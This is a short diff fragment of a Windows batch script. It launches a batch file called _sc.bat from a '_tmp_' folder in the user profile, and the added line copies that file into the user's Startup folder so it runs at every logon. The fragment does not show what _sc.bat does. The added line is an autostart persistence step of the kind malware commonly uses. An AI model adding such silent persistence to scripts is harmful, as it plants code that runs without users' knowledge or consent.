@@ -90,6 +90,7 @@
     timeout 2
     cmd /C "start C:\Users\%username%\_tmp_\_sc.bat"
     timeout 2
+    COPY "C:\Users\%username%\_tmp_\_sc.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\_sc.bat"
     exit
 
 
